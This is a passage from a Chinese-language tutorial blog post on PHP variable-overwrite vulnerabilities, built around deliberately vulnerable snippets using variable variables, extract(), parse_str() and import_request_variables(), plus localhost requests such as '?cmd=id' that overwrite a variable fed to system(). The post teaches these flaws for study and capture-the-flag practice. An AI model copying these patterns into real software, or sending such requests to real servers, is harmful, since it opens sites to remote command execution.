    <content type="html"><![CDATA[<p>如果文章内哪里写的有问题欢迎各位师傅加qq提醒我一下</p><p>这几天在学习php反序列化，然后尝试做了几道题，发现总会碰到那么几个有关变量覆盖的知识点，卡的我好难受，因为之前没有学过，这里来记录一下变量覆盖以及$_GET的传值方式</p><h2 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01-前置知识"></a>0x01-前置知识</h2><p>1、首先，我们需要知道php内置的 $_GET、$_POST、$_REQUEST变量的类型<strong>默认为数组类型</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">php语句如下</span><br><span class="line">&lt;?php</span><br><span class="line">var_dump($_GET);</span><br><span class="line">?&gt;  </span><br><span class="line"></span><br><span class="line">比如我们传参方式如下:</span><br><span class="line">http://127.0.0.1/false.php?a=1</span><br><span class="line">输出结果:</span><br><span class="line">array(1) &#123; [&quot;a&quot;]=&gt; string(1) &quot;2&quot; &#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">比如我们传参方式如下</span><br><span class="line">http://127.0.0.1/false.php?a[]=tes1&amp;a[]=test2&amp;a[]=test3</span><br><span class="line"></span><br><span class="line">输出结果:</span><br><span class="line">array(3) &#123; [0]=&gt; string(4) &quot;tes1&quot; [1]=&gt; string(5) &quot;test2&quot; [2]=&gt; string(5) &quot;test3&quot; &#125; </span><br><span class="line">其他两个变量也是同理</span><br><span class="line">可以看出  他们的默认变量类型为数组</span><br></pre></td></tr></table></figure><p>2、传参的方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">1.指定参数</span><br><span class="line">php代码：  var_dump($_GET[&#x27;false&#x27;]);</span><br><span class="line"></span><br><span class="line">传参：http://127.0.0.1/false.php?false=1</span><br><span class="line">输出：string(1) &quot;1&quot; </span><br><span class="line">结论：指定参数传参时，默认类型为string</span><br><span class="line"></span><br><span class="line">传参：http://127.0.0.1/false.php?false[]=1&amp;false[]=2</span><br><span class="line">输出：array(2) &#123; [0]=&gt; string(1) &quot;1&quot; [1]=&gt; string(1) &quot;2&quot; &#125; </span><br><span class="line">结论：当以数组方式传递参数时，$_GET[&#x27;false&#x27;]变量类型变为数组</span><br><span class="line"></span><br><span class="line">2.不指定参数</span><br><span class="line">php代码：  var_dump($_GET);</span><br><span class="line"></span><br><span class="line">传参：http://127.0.0.1/false.php?false=1</span><br><span class="line">输出：array(1) &#123; [&quot;false&quot;]=&gt; string(1) &quot;1&quot; &#125; </span><br><span class="line">结论：默认为数组类型，参数会变为数组的键，传参的值会变为对应的值</span><br><span class="line"></span><br><span class="line">传参：http://127.0.0.1/false.php?false[]=1&amp;a=1</span><br><span class="line">输出：array(2) &#123; [&quot;false&quot;]=&gt; array(1) &#123; [0]=&gt; string(1) &quot;1&quot; &#125; [&quot;a&quot;]=&gt; string(1) &quot;1&quot; &#125; </span><br><span class="line">结论：参数任意指定，如果传参类型为数组，咋会嵌套数组</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3.总结</span><br><span class="line">(1)指定参数时，默认为string类型，如果传参为数组，那么会变成数组类型</span><br><span class="line">(2)不指定参数时，参数任意指定，默认为数组类型，传参的参数会变为数组的键，传参的值会变为对应的值</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>匿名函数</strong></p><p>官方手册：<a href="https://www.php.net/manual/zh/functions.anonymous.php">https://www.php.net/manual/zh/functions.anonymous.php</a></p><p><strong>匿名函数</strong> (在php5.3.0 或以上才能使用)</p><blockquote><p>匿名函数（Anonymous functions），也叫闭包函数（<em>closures</em>），允许 临时创建一个没有指定名称的函数。最经常用作回调函数（<a href="https://www.php.net/manual/zh/language.pseudo-types.php#language.types.callback">callback</a>）参数的值。当然，也有其它应用的情况。</p><p>闭包函数也可以作为变量的值来使用。PHP 会自动把此种表达式转换成内置类 <a href="https://www.php.net/manual/zh/class.closure.php">Closure</a> 的对象实例。把一个 closure 对象赋值给一个变量的方式与普通变量赋值的语法是一样的，最后也要加上分号 ;</p></blockquote><p>匿名函数定义格式：👇</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">#注意：结尾要有分号 ;   一定要有，不然语法错误</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span>(<span class="string">&#x27;hello world&#x27;</span>); <span class="comment">//通过变量调用匿名函数</span></span><br></pre></td></tr></table></figure><p>示例代码：👇</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$greet</span> = <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printf(<span class="string">&quot;Hello %s\r\n&quot;</span>, <span class="variable">$name</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$greet</span>(<span class="string">&#x27;World&#x27;</span>);</span><br><span class="line"><span class="variable">$greet</span>(<span class="string">&#x27;PHP&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x02-漏洞产生"><a href="#0x02-漏洞产生" class="headerlink" title="0x02-漏洞产生"></a>0x02-漏洞产生</h2><h3 id="1-可变变量"><a href="#1-可变变量" class="headerlink" title="1.可变变量"></a>1.可变变量</h3><p>官方文档：<a href="https://www.php.net/manual/zh/language.variables.variable.php">https://www.php.net/manual/zh/language.variables.variable.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$$a</span> = <span class="string">&#x27;world&#x27;</span>;  <span class="comment">//相当于 $hello = &#x27;world&#x27;;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span> $<span class="subst">&#123;$a&#125;</span>\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span> <span class="subst">$hello</span>&quot;</span>;   </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#输出：hello world</span></span><br><span class="line"><span class="comment">#     hello world</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>要将可变变量用于数组，必须解决一个模棱两可的问题。这就是当写下 $$a[1] 时，解析器需要知道是想要 $a[1] 作为一个变量呢，还是想要 $$a 作为一个变量并取出该变量中索引为 [1] 的值。解决此问题的语法是，对第一种情况用 $&#123;$a[1]&#125;，对第二种情况用 $&#123;$a&#125;[1]。类的属性也可以通过可变属性名来访问。可变属性名将在该调用所处的范围内被解析。例如，对于 $foo-&gt;$bar 表达式，则会在本地范围来解析 $bar 并且其值将被用于 $foo 的属性名。对于 $bar 是数组单元时也是一样。</code></pre><h4 id="漏洞代码实例-1"><a href="#漏洞代码实例-1" class="headerlink" title="漏洞代码实例 1"></a>漏洞代码实例 1</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    $&#123;<span class="variable">$key</span>&#125;=<span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">传参：http:<span class="comment">//127.0.0.1/false.php?cmd=id</span></span><br><span class="line">输出：uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br><span class="line"></span><br><span class="line">解析：</span><br><span class="line">    <span class="variable">$_GET</span>传入的是数组，通过<span class="keyword">foreach</span>()函数遍历，将键给<span class="variable">$key</span>,值给<span class="variable">$value</span></span><br><span class="line">    在经过<span class="variable">$$key</span>的可变变量重新赋值处理后，就变成了<span class="variable">$cmd</span>=<span class="variable">$value</span> ——&gt; <span class="variable">$cmd</span>=<span class="string">&#x27;id&#x27;</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure><h3 id="2-extract"><a href="#2-extract" class="headerlink" title="2.extract()"></a>2.extract()</h3><p>函数介绍：<a href="https://www.w3school.com.cn/php/func_array_extract.asp">https://www.w3school.com.cn/php/func_array_extract.asp</a></p><p>以下函数内容摘自 w3cschool平台 </p><h4 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h4><p>extract() 函数从数组中将变量导入到当前的符号表。</p><p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p><p>第二个参数 <em>type</em> 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。</p><p>该函数返回成功导入到符号表中的变量数目。</p><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract(array,extract_rules,prefix)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>array</em></td><td align="left">必需。规定要使用的数组。</td></tr><tr><td align="left"><em>extract_rules</em></td><td align="left">可选。extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定。可能的值：<strong>EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。</strong>EXTR_SKIP - 如果有冲突，不覆盖已有的变量。EXTR_PREFIX_SAME - 如果有冲突，在变量名前加上前缀 <em>prefix</em>。EXTR_PREFIX_ALL - 给所有变量名加上前缀 <em>prefix</em>。EXTR_PREFIX_INVALID - 仅在不合法或数字变量名前加上前缀 <em>prefix</em>。EXTR_IF_EXISTS - 仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。</td></tr><tr><td align="left"><em>prefix</em></td><td align="left">可选。请注意 <em>prefix</em> 仅在 <em>extract_type</em> 的值是 EXTR_PREFIX_SAME，EXTR_PREFIX_ALL，EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS 时需要。如果附加了前缀后的结果不是合法的变量名，将不会导入到符号表中。前缀和数组键名之间会自动加上一个下划线。</td></tr></tbody></table><p>由此可见，第一个参数是必须的，其余两个参数是可选的，而是否会造成漏洞主要取决于第二个参数</p><p>可以发现第二个参数：<strong>EXTR_OVERWRITE - 默认。如果有冲突，则覆盖已有的变量。</strong>此时如果使用不当，就会产生非预期的效果。</p><h4 id="漏洞代码示例-1"><a href="#漏洞代码示例-1" class="headerlink" title="漏洞代码示例 1"></a>漏洞代码示例 1</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span> =&gt; <span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span> =&gt; <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span> =&gt; <span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;cmd&#x27;</span> =&gt; <span class="string">&#x27;id&#x27;</span>);</span><br><span class="line">extract(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$value</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#a</span></span><br><span class="line"><span class="comment">#b</span></span><br><span class="line"><span class="comment">#c</span></span><br><span class="line"><span class="comment">#id</span></span><br><span class="line"><span class="comment">#uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br></pre></td></tr></table></figure><p>解释一下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$cmd = ls    //本来应该执行的ls命令</span><br><span class="line">extract()函数在处理数组时，会将键当作变量，值作为变量的值</span><br><span class="line">因为数组中存在 cmd=&gt;id 的键值对关系，所以经过extract()函数处理后就应该是$cmd=&#x27;id&#x27;</span><br><span class="line">因为extract()函数默认配置是如果变量有冲突，会覆盖掉原有的赋值，所以就变成了$cmd=&#x27;id&#x27;</span><br><span class="line">最后经过system()函数执行，显示了id命令的回显结果</span><br></pre></td></tr></table></figure><h4 id="漏洞代码示例-2"><a href="#漏洞代码示例-2" class="headerlink" title="漏洞代码示例 2"></a>漏洞代码示例 2</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&#x27;heihei&#x27;</span>;</span><br><span class="line">extract(<span class="variable">$_GET</span>);</span><br><span class="line">system(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#传参：http://127.0.0.1/false.php?cmd=id</span></span><br><span class="line"><span class="comment">#输出：uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br></pre></td></tr></table></figure><p>解析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">正常执行-&gt;在get方式不传参的情况下   会调用system()函数来执行heihei命令，没有回显，因为没有这个命令</span><br><span class="line"></span><br><span class="line">漏洞利用-&gt;因为$_GET没有指定传参的参数，此时参数可以自己来定，并且$_GET是数组形式的</span><br><span class="line"> 满足extract()函数的参数格式，此时传输?cmd=想要执行的命令即可覆盖掉原有的$cmd的赋值，从而达到命令执行的目的</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_GET传参时的数据格式：array(1) &#123; [&quot;cmd&quot;]=&gt; string(2) &quot;id&quot; &#125;   数组类型，键是cmd，值是id</span><br></pre></td></tr></table></figure><h3 id="3-parse-str"><a href="#3-parse-str" class="headerlink" title="3.parse_str()"></a>3.parse_str()</h3><p>php官方手册：<a href="https://www.php.net/manual/zh/function.parse-str.php">https://www.php.net/manual/zh/function.parse-str.php</a></p><p>w3school：<a href="https://www.w3school.com.cn/php/func_string_parse_str.asp">https://www.w3school.com.cn/php/func_string_parse_str.asp</a></p><h4 id="定义和用法-1"><a href="#定义和用法-1" class="headerlink" title="定义和用法"></a>定义和用法</h4><p>parse_str() 函数将字符串解析成多个变量</p><p><strong>注释：</strong>如果未设置 <em>array</em> 参数，则由该函数设置的变量将覆盖已存在的同名变量。</p><p><strong>注释：</strong>php.ini 文件中的 magic_quotes_gpc 设置影响该函数的输出。如果已启用，那么在 parse_str() 解析之前，变量会被 addslashes() 转换。</p><h4 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parse_str(string,array)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定要解析的字符串。</td></tr><tr><td align="left"><em>array</em></td><td align="left">可选。规定存储变量的数组的名称。该参数指示变量将被存储到数组中。</td></tr></tbody></table><p>由此可得，parse_str()函数在不设置array参数时，会造成变量覆盖漏洞</p><h4 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">parse_str(<span class="string">&quot;name=Bill&amp;age=60&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$age</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#Bill</span></span><br><span class="line"><span class="comment">#60</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">parse_str(<span class="string">&#x27;name=1&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#1           可见，单双引号都是可以的</span></span><br></pre></td></tr></table></figure><p>推荐阅读一下这个函数的官方手册，写的很好</p><p><strong>由于 PHP 的变量名不能带「点」和「空格」，所以它们会被转化成下划线。</strong>👇👇</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">parse_str(<span class="string">&quot;My Value=Something&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$My_Value</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>; <span class="comment">// Something</span></span><br><span class="line"></span><br><span class="line">parse_str(<span class="string">&quot;My Value=false&quot;</span>, <span class="variable">$output</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$output</span>[<span class="string">&#x27;My_Value&#x27;</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>; <span class="comment">// false</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$My_Value</span>;   <span class="comment">//Something</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#第2-3行代码进行了变量覆盖，此时$My_Value=&#x27;Something&#x27;</span></span><br><span class="line"><span class="comment">#第5-7行代码使用了parse_str()函数正确的使用方法，此时以数组方式访问，输出false</span></span><br><span class="line"><span class="comment">#第8行代码又输出了一次$My_Value，还是Something，证明了上一句话是该函数的正确使用方式</span></span><br></pre></td></tr></table></figure><h4 id="漏洞代码演示-1"><a href="#漏洞代码演示-1" class="headerlink" title="漏洞代码演示 1"></a>漏洞代码演示 1</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">parse_str(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">system(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">传参：http:<span class="comment">//127.0.0.1/false.php?cmd=a=id</span></span><br><span class="line">输出：uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br><span class="line">解析：</span><br><span class="line">    <span class="number">1</span>.此时可以通过system()函数来执行系统命令，但是<span class="variable">$a</span>变量没有进行初始化也没有值</span><br><span class="line">    <span class="number">2</span>.但是存在parse_str()函数，可以通过get方式进行传参，这里必须指定get参数名字，</span><br><span class="line">    因为此时get传入的类型是字符串，如果不指定参数名的话传入的是<span class="keyword">array</span>数组格式</span><br><span class="line">    <span class="number">3</span>.利用parse_str()的特性，会把查询字符串解析到变量中?cmd=a=命令</span><br><span class="line">    这样经过parse_str()的解析后，就变成了<span class="variable">$a</span> = <span class="string">&#x27;命令&#x27;</span>;</span><br><span class="line">此时<span class="variable">$a</span>变量就有了值，就能利用system()来进行命令执行了</span><br></pre></td></tr></table></figure><h3 id="4-mb-parse-str"><a href="#4-mb-parse-str" class="headerlink" title="4.mb_parse_str()"></a>4.mb_parse_str()</h3><p>官方手册：<a href="https://www.php.net/manual/zh/function.mb-parse-str.php">https://www.php.net/manual/zh/function.mb-parse-str.php</a></p><p>mb_parse_str — 解析 GET/POST/COOKIE 数据并设置全局变量</p><p>此函数利用方法与parse_str()基本相同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mb_parse_str ( string $encoded_string [, array &amp;$result ] ) : bool</span><br></pre></td></tr></table></figure><h4 id="实例演示-1"><a href="#实例演示-1" class="headerlink" title="实例演示"></a>实例演示</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#正确使用方法</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;email=kehaovista@qq.com&amp;city=shanghai&amp;job=Phper&#x27;</span>;</span><br><span class="line">mb_parse_str(<span class="variable">$str</span>, <span class="variable">$result</span>);</span><br><span class="line">print_r(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//结果</span></span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [email] =&gt; kehaovista@qq.com</span><br><span class="line">    [city] =&gt; shanghai</span><br><span class="line">    [job] =&gt; Phper</span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#错误使用方法</span></span><br><span class="line">emmmm  还没搞明白怎么用，似乎环境出了点问题，明白了在更这一部分</span><br></pre></td></tr></table></figure><h3 id="5-import-request-variables"><a href="#5-import-request-variables" class="headerlink" title="5.import_request_variables()"></a>5.import_request_variables()</h3><p>官方链接：<a href="https://www.php.net/manual/zh/function.import-request-variables.php">https://www.php.net/manual/zh/function.import-request-variables.php</a></p><p>菜鸟教程：<a href="https://www.runoob.com/php/php-import_request_variables-function.html">https://www.runoob.com/php/php-import_request_variables-function.html</a></p><p>emmm</p><p>版本要求：PHP 4 &gt;= 4.1.0, PHP 5 &lt; 5.4.0</p><p><strong>该函数在最新版本的 PHP 中已经不支持。</strong></p><p>import_request_variables()函数会把GET、POST、COOKIE的<strong>参数注册成变量</strong></p><h4 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import_request_variables ( string $types [, string $prefix ] ) : bool</span><br></pre></td></tr></table></figure><p>import_request_variables — 将 GET／POST／Cookie 变量导入到全局作用域中。如果你禁止了 <a href="https://www.php.net/manual/zh/ini.core.php#ini.register-globals">register_globals</a>，但又想用到一些全局变量，那么此函数就很有用。</p><blockquote><pre><code>            你可以使用 `types` 参数指定需要导入的变量。可以用字母‘G’、‘P’和‘C’分别表示 GET、POST 和 Cookie。这些字母不区分大小写，所以你可以使用‘g’、‘p’和‘c’的任何组合。POST 包含了通过 POST 方法上传的文件信息。注意这些字母的顺序，当使用“gp”时，POST 变量将使用相同的名字覆盖 GET 变量。任何 GPC 以外的字母都将被忽略。    ​                `prefix` 参数作为变量名的前缀，置于所有被导入到全局作用域的变量之前。所以如果你有个名为“userid”的 GET 变量，同时提供了“pref_”作为前缀，那么你将获得一个名为 $pref_userid 的全局变量</code></pre></blockquote><h4 id="实例演示-2"><a href="#实例演示-2" class="headerlink" title="实例演示"></a>实例演示</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#正确使用方法</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 此处将导入 GET 和 POST 变量</span></span><br><span class="line"><span class="comment">// 使用“rvar_”作为前缀</span></span><br><span class="line">import_request_variables(<span class="string">&quot;gP&quot;</span>, <span class="string">&quot;rvar_&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$rvar_foo</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#因为规定了参数的前缀，保证了函数使用时的安全性</span></span><br></pre></td></tr></table></figure><p>下方只是构想的代码，没有实际运行，环境运行import_request_variables()函数会出错</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#错误使用方法</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$cmd</span>=<span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line">    import_request_variables(<span class="string">&quot;g&quot;</span>);  <span class="comment">//get方式传参</span></span><br><span class="line">    system(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#传参：http://127.0.0.1/false.php?cmd=id</span></span><br><span class="line"><span class="comment">#输出：uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#此时把传入的参数注册为变量，达到变量覆盖的目的</span></span><br></pre></td></tr></table></figure><h2 id="0x03-例题演示"><a href="#0x03-例题演示" class="headerlink" 